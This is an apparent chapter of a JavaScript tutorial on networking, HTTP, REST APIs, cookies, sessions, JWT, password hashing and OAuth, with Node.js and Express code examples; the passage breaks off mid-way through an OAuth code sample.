# ABSOLUTE JAVASCRIPT ECOSYSTEM MASTERY

# Part 14 — Networking, HTTP, REST APIs, WebSockets, GraphQL, Authentication, Security, Cookies, Sessions, JWT, OAuth, CORS, and API Architecture

---

# Mission

Modern applications are fundamentally distributed systems.

```
Mobile App
     ↓
API Server
     ↓
Database
     ↓
Cache
     ↓
External Services
```

JavaScript powers communication between these systems.

Understanding networking deeply is required for:

- Backend engineering
- Full-stack development
- Microservices
- Cloud systems
- Authentication systems
- Real-time applications

---

# OVERALL NETWORK MODEL

```
Application Layer  ← HTTP, WebSocket, gRPC
↓
Transport Layer    ← TCP, UDP
↓
Network Layer      ← IP
↓
Link Layer         ← Ethernet, WiFi
↓
Physical Layer     ← Cables, Radio
```

| Layer | Example Protocols | Responsibility |
|-------|------------------|----------------|
| Application | HTTP, WebSocket, DNS, gRPC | Data format and semantics |
| Transport | TCP, UDP | Reliability, ordering, ports |
| Network | IPv4, IPv6 | Addressing, routing |
| Link | Ethernet, WiFi | Physical transmission |

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Which layer does this problem belong to? | Application? Transport? Network? |
| Is it a protocol issue or data issue? | Protocol → lower layers. Data → application layer |

---

# PART I — INTERNET FUNDAMENTALS

---

# Chapter 1 — Client and Server

## Roles

| Role | Initiates connection? | Examples |
|------|----------------------|----------|
| **Client** | Yes (sends request) | Browser, mobile app, curl, Postman |
| **Server** | No (listens) | Node.js http server, Nginx, Apache |

## Request-Response Cycle

```
Client                         Server
  │                               │
  │────── HTTP Request ──────────►│
  │                               │  Process request
  │◄───── HTTP Response ──────────│
  │                               │
```

A single request-response cycle is the basic unit of web communication.

---

# Chapter 2 — IP Address

## IPv4

32-bit address. 4 octets. ~4.3 billion addresses.

```
192 . 168 .  1  . 10
11000000 10101000 00000001 00001010
```

## IPv6

128-bit address. 8 groups of 4 hex digits. ~340 undecillion addresses.

```
2001:0db8:85a3:0000:0000:8a2e:0370:7334
```

Common shorthand (omit leading zeros):

```
2001:db8:85a3::8a2e:370:7334
```

## Special Addresses

| Address | Purpose |
|---------|---------|
| `127.0.0.1` (localhost) | Loopback — your own machine |
| `0.0.0.0` | All interfaces (bind to all IPs) |
| `192.168.x.x` | Private network |
| `10.x.x.x` | Private network |
| `::1` | IPv6 localhost |

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Which machine is being contacted? | Resolve hostname → IP |
| Is it local or remote? | `127.0.0.1` = local. Public IP = remote |

---

# Chapter 3 — Domain Name System (DNS)

## Why DNS Exists

Humans remember names. Computers need numbers.

```
Human: google.com
         ↓
DNS resolves
         ↓
Computer: 142.250.80.46
```

## DNS Resolution Flow

```
Browser enters google.com
       ↓
1. Check browser cache
2. Check OS cache (hosts file)
3. Check router cache
4. Query ISP's recursive DNS resolver
       ↓
5. Root DNS server → points to .com TLD server
6. .com TLD server → points to google.com nameserver
7. google.com nameserver → returns IP address
       ↓
Browser connects to 142.250.80.46
```

## DNS Record Types

| Type | Purpose | Example |
|------|---------|---------|
| `A` | IPv4 address | `google.com → 142.250.80.46` |
| `AAAA` | IPv6 address | `google.com → 2607:f8b0::...` |
| `CNAME` | Canonical name (alias) | `www.example.com → example.com` |
| `MX` | Mail exchange | `@ → mail.google.com` |
| `TXT` | Text data (verification) | `SPF`, `DKIM` records |
| `NS` | Nameserver | `ns1.google.com` |

## DNS in Node.js

```javascript
const dns = require('dns');

// Uses libuv thread pool (system getaddrinfo)
dns.lookup('google.com', (err, address, family) => {
    console.log(address); // '142.250.80.46'
    console.log(family);  // 4
});

// Uses Node's own DNS resolver (bypasses thread pool)
dns.resolve('google.com', 'A', (err, records) => {
    console.log(records); // ['142.250.80.46', ...]
});
```

## DNS Caching

```javascript
const dns = require('dns');

// Custom cache
const cache = new Map();

function cachedLookup(hostname) {
    if (cache.has(hostname)) {
        return Promise.resolve(cache.get(hostname));
    }

    return new Promise((resolve, reject) => {
        dns.lookup(hostname, (err, address) => {
            if (err) return reject(err);
            cache.set(hostname, address);
            resolve(address);
        });
    });
}
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| What happens when DNS fails? | Browser shows DNS error — cannot resolve host |
| Is DNS cached? | Multiple levels: browser, OS, router, ISP |

---

# PART II — TCP

---

# Chapter 4 — Transmission Control Protocol

## Characteristics

| Property | TCP | UDP |
|----------|-----|-----|
| Connection | Connection-oriented (handshake) | Connectionless |
| Reliability | Guaranteed delivery, retransmission | Best-effort, no guarantee |
| Ordering | Preserves order | No ordering |
| Flow control | Yes (sender adjusts to receiver) | No |
| Use cases | HTTP, WebSocket, email, file transfer | DNS, VoIP, video streaming, gaming |

## TCP Three-Way Handshake

```
Client (SYN_SENT)          Server (LISTEN)
    │                          │
    │────── SYN (seq=100) ────►│  (SYN_RCVD)
    │                          │
    │◄───── SYN-ACK (seq=200, ack=101) ──│
    │                          │
    │────── ACK (seq=101, ack=201) ─────►│  (ESTABLISHED)
    │                          │
    │◄═════ Data Transfer ════►│
```

Total round trips before data: **1** (the third ACK can carry data).

## Ports

```
IP Address: Which machine?
Port:       Which application on that machine?
```

| Port Range | Category | Examples |
|------------|----------|----------|
| 0-1023 | Well-known (requires root) | HTTP(80), HTTPS(443), SSH(22) |
| 1024-49151 | Registered | MySQL(3306), PostgreSQL(5432), Redis(6379) |
| 49152-65535 | Dynamic/ephemeral | Temporary client ports |

## Connection Termination

```
Client                         Server
  │                              │
  │────── FIN ─────────────────►│
  │                              │
  │◄───── ACK ──────────────────│
  │                              │
  │◄───── FIN ──────────────────│
  │                              │
  │────── ACK ─────────────────►│
  │                              │
  │       (Connection closed)    │
```

## TCP in Node.js

```javascript
const net = require('net');

const server = net.createServer((socket) => {
    console.log('Client connected:', socket.remoteAddress);
    socket.write('Hello from TCP server!\n');
    socket.on('data', (data) => {
        console.log('Received:', data.toString());
    });
});

server.listen(9000, () => {
    console.log('TCP server on :9000');
});
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Is communication connection-based? | TCP is connection-oriented |
| Reliability important? | Use TCP. Real-time tolerance for loss? Use UDP |
| Which port? | Determines which application receives data |

---

# PART III — HTTP

---

# Chapter 5 — HTTP Protocol

## What is HTTP?

**HyperText Transfer Protocol**. Runs on top of TCP (usually port 80) or TLS (port 443).

```
Request:
GET /users HTTP/1.1
Host: api.example.com
Accept: application/json

Response:
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 42

{"users":[{"id":1,"name":"Alice"}]}
```

## HTTP Versions

| Version | Year | Key Feature |
|---------|------|-------------|
| HTTP/1.0 | 1996 | One request per TCP connection |
| HTTP/1.1 | 1997 | Persistent connections, pipelining, chunked transfer |
| HTTP/2 | 2015 | Multiplexing, header compression, server push |
| HTTP/3 | 2022 | Uses QUIC (UDP-based), faster connection setup |

## HTTP/1.1 vs HTTP/2

```
HTTP/1.1: One at a time (or pipelining, limited)
┌────────┐
│ Req 1  │────► Resp 1
│ Req 2  │────► Resp 2   (waiting for 1)
│ Req 3  │────► Resp 3   (waiting for 2)
└────────┘

HTTP/2: Multiplexed
┌────────┐
│ Req 1  │─┐
│ Req 2  │─┤────► Resp 1, Resp 2, Resp 3 simultaneously
│ Req 3  │─┘
└────────┘
```

---

# Chapter 6 — HTTP Methods

| Method | CRUD | Idempotent? | Safe? | Has Body? |
|--------|------|-------------|-------|-----------|
| `GET` | Read | ✅ Yes | ✅ Yes | ❌ No |
| `POST` | Create | ❌ No | ❌ No | ✅ Yes |
| `PUT` | Replace | ✅ Yes | ❌ No | ✅ Yes |
| `PATCH` | Partial update | ❌ No | ❌ No | ✅ Yes |
| `DELETE` | Delete | ✅ Yes | ❌ No | ❌ Maybe |
| `HEAD` | Headers only | ✅ Yes | ✅ Yes | ❌ No |
| `OPTIONS` | Capabilities | ✅ Yes | ✅ Yes | ❌ No |

## Idempotence Explained

```javascript
// Idempotent: calling N times = same as calling once
PUT /users/5
DELETE /users/5

// Not idempotent: each call creates a new resource
POST /users
```

## Safe Methods

Safe methods should not change server state:

```javascript
// Safe: only reads data
app.get('/users', handler);

// Unsafe: changes state
app.post('/users', handler);
```

---

# Chapter 7 — HTTP Status Codes

## 2xx Success

| Code | Name | When |
|------|------|------|
| `200 OK` | Success | GET, PUT, PATCH, DELETE succeeded |
| `201 Created` | Created | POST created a new resource |
| `204 No Content` | Success, no body | DELETE succeeded |

```javascript
res.status(200).json({ data: 'ok' });
res.status(201).json({ id: newId });
res.status(204).send();
```

## 3xx Redirection

| Code | Name | When |
|------|------|------|
| `301 Moved Permanently` | Permanent redirect | SEO, domain change |
| `302 Found` | Temporary redirect | After login, maintenance page |
| `304 Not Modified` | Use cache | Conditional GET (ETag/Last-Modified) |

```javascript
res.redirect(301, '/new-url');
res.status(304).send();
```

## 4xx Client Errors

| Code | Name | When |
|------|------|------|
| `400 Bad Request` | Invalid input | Missing field, bad format |
| `401 Unauthorized` | Not authenticated | Missing/invalid token |
| `403 Forbidden` | Not authorized | Valid user, insufficient permissions |
| `404 Not Found` | Resource doesn't exist | Wrong URL |
| `409 Conflict` | Conflict | Duplicate resource, version conflict |
| `422 Unprocessable Entity` | Validation failed | Invalid email, too short password |
| `429 Too Many Requests` | Rate limited | Exceeded rate limit |

```javascript
app.post('/users', (req, res) => {
    if (!req.body.name) {
        return res.status(400).json({ error: 'Name is required' });
    }
    // ...
});
```

## 5xx Server Errors

| Code | Name | When |
|------|------|------|
| `500 Internal Server Error` | Generic server failure | Uncaught exception |
| `502 Bad Gateway` | Upstream invalid response | Proxy received bad response |
| `503 Service Unavailable` | Server overloaded | Maintenance, too many connections |
| `504 Gateway Timeout` | Upstream timeout | Upstream server didn't respond |

```javascript
app.use((err, req, res, next) => {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
});
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Client problem (4xx) or server problem (5xx)? | 4xx: fix client. 5xx: fix server |
| Is authentication required (401/403)? | 401: login. 403: insufficient rights |
| Is resource missing (404)? | Wrong URL or deleted resource |

---

# Chapter 8 — HTTP Headers

## Request Headers

```text
GET /api/users HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGci...
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0
Cookie: sessionId=abc123
Origin: https://myapp.com
Referer: https://myapp.com/settings
Cache-Control: no-cache
If-None-Match: "etag-value"
```

## Response Headers

```text
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 42
Set-Cookie: sessionId=xyz789; HttpOnly; Secure
Cache-Control: max-age=3600
ETag: "abc123"
Access-Control-Allow-Origin: https://myapp.com
X-Request-Id: req-12345
```

## Important Headers

| Header | Direction | Purpose |
|--------|-----------|---------|
| `Content-Type` | Both | Format of body (`application/json`, `text/html`, `multipart/form-data`) |
| `Authorization` | Request | Credentials (`Bearer <token>`, `Basic <base64>`) |
| `Cookie` | Request | Stored cookies sent automatically |
| `Set-Cookie` | Response | Server instructs browser to store cookie |
| `Cache-Control` | Both | Caching policy (`max-age=3600`, `no-cache`, `no-store`) |
| `Origin` | Request | Where request originated (for CORS) |
| `Access-Control-Allow-Origin` | Response | Which origins are allowed |
| `User-Agent` | Request | Client identification |
| `Accept` | Request | Which formats client accepts |
| `ETag` | Response | Version identifier for caching |
| `Location` | Response | Redirect URL (used with 3xx) |
| `X-Request-Id` | Response | Trace ID for debugging |

---

# Chapter 9 — Request Body

## JSON Body

```javascript
// Client sends:
fetch('/api/users', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'Alice', age: 30 })
});

// Server receives:
app.post('/api/users', (req, res) => {
    console.log(req.body); // { name: 'Alice', age: 30 }
    // Requires body parser middleware:
    // express.json() or manual JSON.parse()
});
```

## URL-Encoded Form Data

```javascript
// Client sends:
fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'username=alice&password=secret'
});

// Content-Type: application/x-www-form-urlencoded
// Body: key=value&key2=value2
```

## Multipart Form Data (File Uploads)

```javascript
// Client sends (FormData):
const formData = new FormData();
formData.append('avatar', fileInput.files[0]);
formData.append('name', 'Alice');

fetch('/api/users', {
    method: 'POST',
    body: formData  // Content-Type automatically set with boundary
});

// Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
```

## Binary Body

```javascript
// Images, videos, audio, etc.
// Content-Type: image/png, video/mp4, audio/mpeg
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| What format is the body? | Check `Content-Type` header |
| JSON, form, or binary? | JSON: `application/json`. Form: `application/x-www-form-urlencoded` or `multipart/form-data`. Binary: image/video/audio types |

---

# PART V — JSON

---

# Chapter 10 — JSON in APIs

## Why JSON Dominates

- **Language-agnostic**: every language can parse it.
- **Human-readable**: unlike binary formats.
- **Lightweight**: less verbose than XML.
- **Native to JavaScript**: `JSON.parse()` and `JSON.stringify()`.

## Serialization

```javascript
const user = { name: 'Alice', age: 30, role: 'admin' };
const json = JSON.stringify(user);
// '{"name":"Alice","age":30,"role":"admin"}'

const parsed = JSON.parse(json);
// { name: 'Alice', age: 30, role: 'admin' }
```

## What JSON Cannot Represent

| JS Type | JSON Behavior |
|---------|---------------|
| `undefined` | Omitted in objects, becomes `null` in arrays |
| `function` | Omitted |
| `Symbol` | Omitted |
| `Date` | Converted to string (must parse manually) |
| `Map`, `Set` | No native representation |
| `BigInt` | Throws (must serialize as string) |

```javascript
const obj = {
    name: 'Alice',
    role: undefined,  // omitted
    greet: function() {}, // omitted
    createdAt: new Date()
};

JSON.stringify(obj);
// '{"name":"Alice","createdAt":"2024-01-15T..."}'
// role and greet are missing
```

## Custom Serialization

```javascript
const user = {
    name: 'Alice',
    password: 'secret',
    toJSON() {
        return {
            name: this.name,
            // Exclude password
        };
    }
};

JSON.stringify(user);
// '{"name":"Alice"}' — password excluded
```

## JSON.parse Reviver

```javascript
const json = '{"name":"Alice","birth":"1990-01-01T00:00:00Z"}';

const user = JSON.parse(json, (key, value) => {
    if (key === 'birth') {
        return new Date(value);
    }
    return value;
});

console.log(user.birth instanceof Date); // true
```

---

# PART VI — REST APIs

---

# Chapter 11 — REST Architecture

## What is REST?

**RE**presentational **S**tate **T**ransfer. An architectural style for designing networked applications.

## Resources

Everything is a **resource** identified by a URL.

```
/users          → Collection of users
/users/5        → Single user (id=5)
/users/5/posts  → Posts by user 5
/users/5/posts/12 → Post 12 by user 5
```

## Operations on Resources

```
GET    /users          → List users (READ)
GET    /users/5        → Get user 5 (READ)
POST   /users          → Create user (CREATE)
PUT    /users/5        → Replace user 5 (UPDATE)
PATCH  /users/5        → Partially update user 5 (UPDATE)
DELETE /users/5        → Delete user 5 (DELETE)
```

## REST Constraints

| Constraint | Description |
|------------|-------------|
| **Stateless** | Each request contains all necessary information. Server does not store client state between requests. |
| **Cacheable** | Responses must define cacheability (via `Cache-Control`). |
| **Uniform Interface** | Resources identified in URLs, manipulated via representations, self-descriptive messages. |
| **Layered System** | Client cannot tell if it's talking directly to server or to a proxy. |
| **Code on Demand** (optional) | Server can send executable code (e.g., JavaScript). |

## REST API Example with Express

```javascript
const express = require('express');
const app = express();
app.use(express.json());

const users = [];
let nextId = 1;

// CREATE
app.post('/api/users', (req, res) => {
    const user = { id: nextId++, ...req.body };
    users.push(user);
    res.status(201).json(user);
});

// READ ALL
app.get('/api/users', (req, res) => {
    res.json(users);
});

// READ ONE
app.get('/api/users/:id', (req, res) => {
    const user = users.find(u => u.id === parseInt(req.params.id));
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json(user);
});

// UPDATE (replace)
app.put('/api/users/:id', (req, res) => {
    const idx = users.findIndex(u => u.id === parseInt(req.params.id));
    if (idx === -1) return res.status(404).json({ error: 'Not found' });
    users[idx] = { id: parseInt(req.params.id), ...req.body };
    res.json(users[idx]);
});

// UPDATE (partial)
app.patch('/api/users/:id', (req, res) => {
    const user = users.find(u => u.id === parseInt(req.params.id));
    if (!user) return res.status(404).json({ error: 'Not found' });
    Object.assign(user, req.body);
    res.json(user);
});

// DELETE
app.delete('/api/users/:id', (req, res) => {
    const idx = users.findIndex(u => u.id === parseInt(req.params.id));
    if (idx === -1) return res.status(404).json({ error: 'Not found' });
    users.splice(idx, 1);
    res.status(204).send();
});
```

## Naming Conventions

| ✅ Good | ❌ Bad |
|---------|--------|
| `GET /users` | `GET /getUsers` |
| `GET /users/5` | `GET /getUser?id=5` |
| `POST /users` | `POST /createUser` |
| `GET /users/5/orders` | `GET /getOrdersForUser/5` |
| Plural nouns | Verbs in URLs |

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Which resource is being accessed? | The URL path identifies the resource |
| Which operation? | HTTP method specifies the action |
| Is the API stateless? | Each request is self-contained |
| RESTful naming? | Plural nouns, no verbs in URLs |

---

# PART VII — URL STRUCTURE

---

# Chapter 12 — Anatomy of a URL

```
https://admin:secret@api.example.com:443/users?id=10&active=true#profile
│      │      │      │                  │   │                 │
│      │      │      │                  │   │                 └── Fragment (#)
│      │      │      │                  │   └──────────────────── Query string (?key=value)
│      │      │      │                  └──────────────────────── Port (:443)
│      │      │      └─────────────────────────────────────────── Host (api.example.com)
│      │      └────────────────────────────────────────────────── Password (:secret)
│      └───────────────────────────────────────────────────────── Username (admin)
└──────────────────────────────────────────────────────────────── Scheme (https)
```

## URL Parsing in Node

```javascript
const url = new URL('https://api.example.com:443/users?id=10&active=true');

console.log(url.protocol);    // 'https:'
console.log(url.hostname);    // 'api.example.com'
console.log(url.port);        // '443'
console.log(url.pathname);    // '/users'
console.log(url.search);      // '?id=10&active=true'
console.log(url.searchParams); // URLSearchParams { 'id' => '10', 'active' => 'true' }

// Query params
console.log(url.searchParams.get('id'));     // '10'
console.log(url.searchParams.has('active'));  // true

// Modify
url.searchParams.set('page', '2');
console.log(url.toString());
```

## Encoding

Spaces and special characters must be encoded:

```javascript
const encoded = encodeURIComponent('hello world & more');
// 'hello%20world%20%26%20more'

const decoded = decodeURIComponent('hello%20world');
// 'hello world'
```

---

# PART VIII — COOKIES

---

# Chapter 13 — HTTP Cookies

## What Cookies Do

Cookies allow servers to store state on the client. The browser automatically sends cookies with every request to the same domain.

## Flow

```
Server → Set-Cookie header → Browser stores cookie
Browser → Cookie header → Server receives cookie
```

## Setting Cookies

```javascript
// Server sends cookie
res.setHeader('Set-Cookie', 'sessionId=abc123; HttpOnly; Secure; SameSite=Lax');

// Or with Express:
res.cookie('sessionId', 'abc123', {
    httpOnly: true,
    secure: true,       // HTTPS only
    sameSite: 'lax',    // CSRF protection
    maxAge: 3600000,    // 1 hour in ms
    path: '/'           // Cookie scope
});
```

## Cookie Attributes

| Attribute | Meaning | Example |
|-----------|---------|---------|
| `Expires` | Expiration date | `Expires=Wed, 21 Oct 2025 07:28:00 GMT` |
| `Max-Age` | Lifetime in seconds | `Max-Age=3600` (1 hour) |
| `Domain` | Which domains receive cookie | `Domain=example.com` |
| `Path` | URL path scope | `Path=/api` |
| `Secure` | HTTPS only | `Secure` |
| `HttpOnly` | JS cannot read (`document.cookie`) | `HttpOnly` |
| `SameSite` | CSRF protection | `Strict`, `Lax`, `None` |
| `Priority` | Eviction priority | `Low` |

## SameSite Explained

| Value | Behavior |
|-------|----------|
| `Strict` | Cookie sent only for same-site requests. Never for cross-site (e.g., clicking a link from another site). |
| `Lax` (default) | Cookie sent for same-site requests and top-level navigation GET requests from other sites. |
| `None` | Cookie sent for all requests. Requires `Secure`. |

## Reading Cookies on Server

```javascript
// Raw Node:
const cookies = req.headers.cookie?.split('; ').reduce((acc, c) => {
    const [key, val] = c.split('=');
    acc[key] = val;
    return acc;
}, {}) || {};

// Express with cookie-parser:
const cookieParser = require('cookie-parser');
app.use(cookieParser());

app.get('/', (req, res) => {
    console.log(req.cookies);  // { sessionId: 'abc123' }
    console.log(req.signedCookies); // If signed
});
```

## Deleting Cookies

```javascript
res.clearCookie('sessionId');
// Sets cookie with empty value and immediate expiration
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Stored in browser? | Yes — cookies are client-side storage |
| Sent automatically? | Yes — browser sends `Cookie` header with every request |
| JS can read? | Only if NOT HttpOnly. HttpOnly prevents `document.cookie` access |
| Secure flag? | Must be true for production (HTTPS) |

---

# PART IX — SESSIONS

---

# Chapter 14 — Server-Side Sessions

## How Sessions Work

```
1. Client sends login request (username + password)
2. Server validates credentials
3. Server creates session (stored in memory/Redis/DB)
4. Server returns session ID in a cookie
5. Browser stores cookie
6. Client sends subsequent requests with cookie
7. Server looks up session by ID
```

## Session Storage

```javascript
const sessions = new Map(); // In-memory (not for production)

function createSession(userId) {
    const sessionId = crypto.randomUUID();
    sessions.set(sessionId, { userId, createdAt: Date.now() });
    return sessionId;
}

function getSession(sessionId) {
    return sessions.get(sessionId);
}

function destroySession(sessionId) {
    sessions.delete(sessionId);
}
```

## Session Middleware (Express)

```javascript
const sessions = new Map();

app.use((req, res, next) => {
    const sessionId = req.cookies?.sessionId;

    if (sessionId && sessions.has(sessionId)) {
        req.session = sessions.get(sessionId);
    } else {
        req.session = null;
    }

    next();
});

// Helper to set session
function login(req, res, userId) {
    const sessionId = crypto.randomUUID();
    sessions.set(sessionId, { userId, createdAt: Date.now() });

    res.cookie('sessionId', sessionId, {
        httpOnly: true,
        secure: true,
        sameSite: 'lax',
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });
}

function logout(req, res) {
    if (req.cookies?.sessionId) {
        sessions.delete(req.cookies.sessionId);
    }
    res.clearCookie('sessionId');
}
```

## Session Stores

| Store | Characteristics |
|-------|-----------------|
| **In-memory** | Fast but lost on restart, not shareable across processes |
| **Redis** | Fast, persistent, shared across processes/clusters |
| **Database** | Persistent, slower, good for long-term sessions |
| **Files** | Simple but slow, not for production |

## Session vs JWT

| Feature | Session | JWT |
|---------|---------|-----|
| State location | Server-side | Client-side |
| Revocation | Immediate (delete session) | Cannot revoke (until expiry) |
| Scaling | Need shared session store | Stateless — easier to scale |
| Size | Cookie is small (session ID) | Token can be large |
| Security | Session ID is opaque | Token payload is readable (but signed) |

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| State stored server-side? | Session (lookup by ID) |
| State stored client-side? | JWT (token contains data) |
| Can session be revoked? | Yes — delete from store |
| Can JWT be revoked? | No — must wait for expiry or maintain blocklist |

---

# PART X — JWT (JSON Web Token)

---

# Chapter 15 — Stateless Authentication

## JWT Structure

A JWT has three parts separated by dots:

```
xxxxx.yyyyy.zzzzz
  │     │     │
  │     │     └── Signature (verification)
  │     └──────── Payload (data)
  └────────────── Header (algorithm + type)
```

## Header

```json
{
    "alg": "HS256",
    "typ": "JWT"
}
```

## Payload (Claims)

```json
{
    "sub": "1234567890",
    "name": "Alice",
    "iat": 1516239022,
    "exp": 1516242622,
    "role": "admin"
}
```

Standard claims:

| Claim | Full Name | Purpose |
|-------|-----------|---------|
| `sub` | Subject | User identifier |
| `iss` | Issuer | Who issued the token |
| `aud` | Audience | Intended recipient |
| `exp` | Expiration | Token expiry timestamp |
| `iat` | Issued At | When token was created |
| `nbf` | Not Before | Token not valid before this time |

## Creating and Verifying JWT

```javascript
const jwt = require('jsonwebtoken'); // npm install jsonwebtoken

const SECRET = 'your-256-bit-secret'; // Store in environment variable

// Create token
function createToken(user) {
    return jwt.sign(
        { sub: user.id, role: user.role },
        SECRET,
        { expiresIn: '1h' }
    );
}

// Verify token (middleware)
function authenticate(req, res, next) {
    const authHeader = req.headers.authorization;

    if (!authHeader?.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Missing token' });
    }

    const token = authHeader.slice(7); // Remove 'Bearer '

    try {
        const payload = jwt.verify(token, SECRET);
        req.user = payload;
        next();
    } catch (err) {
        if (err.name === 'TokenExpiredError') {
            return res.status(401).json({ error: 'Token expired' });
        }
        return res.status(401).json({ error: 'Invalid token' });
    }
}

// Usage
app.post('/login', (req, res) => {
    const user = authenticateUser(req.body);
    const token = createToken(user);
    res.json({ token });
});

app.get('/profile', authenticate, (req, res) => {
    res.json({ user: req.user });
});
```

## JWT vs Session

```
Session:
Client           Server
  │                │
  │── sessionId ──►│  Look up session in store
  │                │
  │◄──── data ─────│

JWT:
Client           Server
  │                │
  │── token ──────►│  Verify signature, extract payload
  │                │  (No store lookup needed)
  │◄──── data ─────│
```

## JWT Best Practices

- **Keep payload small** (token is sent with every request).
- **Use short expiration** (15 min - 1 hour).
- **Use refresh tokens** for long-lived sessions.
- **Store tokens securely** (HttpOnly cookie, not localStorage).
- **Use RS256** (asymmetric) for microservices (public key to verify, private key to sign).

## Refresh Token Pattern

```javascript
// Short-lived access token (15 min)
const accessToken = jwt.sign(
    { sub: userId },
    ACCESS_SECRET,
    { expiresIn: '15m' }
);

// Long-lived refresh token (7 days)
const refreshToken = jwt.sign(
    { sub: userId, type: 'refresh' },
    REFRESH_SECRET,
    { expiresIn: '7d' }
);

// Refresh endpoint
app.post('/refresh', (req, res) => {
    const { refreshToken } = req.body;

    try {
        const payload = jwt.verify(refreshToken, REFRESH_SECRET);

        // Issue new access token
        const newAccessToken = jwt.sign(
            { sub: payload.sub },
            ACCESS_SECRET,
            { expiresIn: '15m' }
        );

        res.json({ accessToken: newAccessToken });
    } catch {
        res.status(401).json({ error: 'Invalid refresh token' });
    }
});
```

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Session or JWT? | Session: server state. JWT: client state |
| Is token expired? | Check `exp` claim |
| Can payload be read? | Base64-decoded — always readable (but signed) |
| Can payload be modified? | No — signature verification fails |

---

# PART XI — AUTHENTICATION vs AUTHORIZATION

---

# Chapter 16 — Authentication

Authentication = **Who are you?**

```javascript
function authenticate(req, res, next) {
    // Verify credentials (password, token, biometric)
    // If valid → set req.user
    // If invalid → 401 Unauthorized
}
```

**Methods**:

- Password
- OTP (one-time password)
- OAuth (Google, GitHub, etc.)
- JWT
- Session cookie
- API key
- Biometric (fingerprint, face)

---

# Chapter 17 — Authorization

Authorization = **What are you allowed to do?**

```javascript
function authorize(...allowedRoles) {
    return (req, res, next) => {
        if (!allowedRoles.includes(req.user.role)) {
            return res.status(403).json({ error: 'Forbidden' });
        }
        next();
    };
}

// Usage
app.delete('/users/:id', authenticate, authorize('admin'), (req, res) => {
    // Only admin can delete users
});
```

## Role-Based Access Control (RBAC)

```javascript
const roles = {
    admin: ['read:users', 'create:users', 'delete:users', 'read:reports'],
    editor: ['read:users', 'create:users'],
    viewer: ['read:users']
};

function authorizePermission(permission) {
    return (req, res, next) => {
        const userPermissions = roles[req.user.role];
        if (!userPermissions?.includes(permission)) {
            return res.status(403).json({ error: 'Insufficient permissions' });
        }
        next();
    };
}

app.delete('/users/:id', authenticate, authorizePermission('delete:users'), handler);
```

---

# PART XII — PASSWORD SECURITY

---

# Chapter 18 — Storing Passwords

## Never Do This

```javascript
// BAD: Plain text
db.users.insert({ username: 'alice', password: 'password123' });
// If database is breached → all passwords exposed
```

## Hash + Salt

```javascript
const bcrypt = require('bcrypt'); // npm install bcrypt

const SALT_ROUNDS = 12;

async function hashPassword(password) {
    // bcrypt generates a random salt internally
    const hash = await bcrypt.hash(password, SALT_ROUNDS);
    return hash;
    // Result: $2b$12$... (includes algorithm, rounds, salt, and hash)
}

async function verifyPassword(password, hash) {
    return bcrypt.compare(password, hash);
    // true or false
}

// Registration
app.post('/register', async (req, res) => {
    const hash = await hashPassword(req.body.password);
    await db.users.insert({ username: req.body.username, passwordHash: hash });
    res.status(201).json({ message: 'User created' });
});

// Login
app.post('/login', async (req, res) => {
    const user = await db.users.findOne({ username: req.body.username });
    if (!user) return res.status(401).json({ error: 'Invalid credentials' });

    const valid = await verifyPassword(req.body.password, user.passwordHash);
    if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

    // Create session/JWT
});
```

## Password Hashing Algorithms

| Algorithm | Purpose | Recommended? |
|-----------|---------|--------------|
| **bcrypt** | Password hashing | ✅ Yes (slow by design) |
| **argon2** | Password hashing | ✅ Yes (winner of PHC, most secure) |
| **scrypt** | Password hashing | ✅ Yes (memory-hard) |
| **PBKDF2** | Key derivation | ⚠️ Okay but weaker than bcrypt/argon2 |
| **SHA-256** | General hashing | ❌ No (too fast — brute-force is easy) |

## Reverse Engineering Questions

| Question | Answer |
|----------|--------|
| Is password reversible? | No — hashes are one-way |
| Is salt used? | Prevents rainbow table attacks |
| Is algorithm slow enough? | bcrypt/argon2/scrypt are intentionally slow |

---

# PART XIII — OAuth 2.0

---

# Chapter 19 — Delegated Authorization

## What OAuth Solves

Before OAuth: You give your Google password to third-party apps. If the app is compromised, your Google account is compromised.

With OAuth: You authorize the app to access specific data without sharing your password.

## OAuth Roles

| Role | Example |
|------|---------|
| **Resource Owner** | You (the user) |
| **Client** | Third-party app (e.g., "My Notes App") |
| **Authorization Server** | Google's OAuth server |
| **Resource Server** | Google's API (e.g., Google Drive) |

## OAuth Flow (Authorization Code)

```
1. User clicks "Login with Google"
2. App redirects to Google:
   https://accounts.google.com/o/oauth2/auth?
     client_id=APP_ID&
     redirect_uri=https://myapp.com/callback&
     response_type=code&
     scope=email%20profile

3. User logs into Google, grants permissions
4. Google redirects back to app with code:
   https://myapp.com/callback?code=AUTH_CODE

5. App sends code to Google's token endpoint:
   POST https://oauth2.googleapis.com/token
   { code: AUTH_CODE, client_id, client_secret, redirect_uri }

6. Google returns:
   { access_token: "...", refresh_token: "...", expires_in: 3600 }

7. App uses access_token to call Google APIs:
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Authorization: Bearer ACCESS_TOKEN
```

## OAuth in Node

```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
